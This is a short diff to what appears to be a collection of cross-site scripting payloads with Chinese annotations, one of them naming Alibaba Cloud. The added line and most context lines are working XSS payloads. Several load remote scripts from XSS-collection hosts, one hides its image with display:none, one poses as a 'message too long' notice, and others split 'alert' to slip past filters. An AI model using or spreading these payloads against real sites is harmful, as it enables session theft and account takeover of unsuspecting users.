@@ -13,6 +13,7 @@ windiow
 <svg/onload=location=location.hash.substr(1)>#javascript:alert(1)
 <svg/onload=eval(location.hash.slice(1))>#alert(1)
 阿里云 ：  <input %26%2362%3B onfocus="document.body.appendChild(createElement('script')).src='//xss.wtf/B6Bb'" autofocus>
+<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='xss.sb'; Style ="display:none;"> img隐藏Style ="display:none;"
 <div onmouseover="!(function(){var s=document.createElement('script');document.getElementsByTagName('body')[0].appendChild(s);s.src='https://xsshs.cn/****';})()"> 留言字数超出限制,请点击内容查看全文</div> by：T-ice
 <img src=1 a=al c=ert onerror=top[a%2bc](0)>
 <img src=1 alt=al lang=ert onerror=top[alt%2blang](0)>
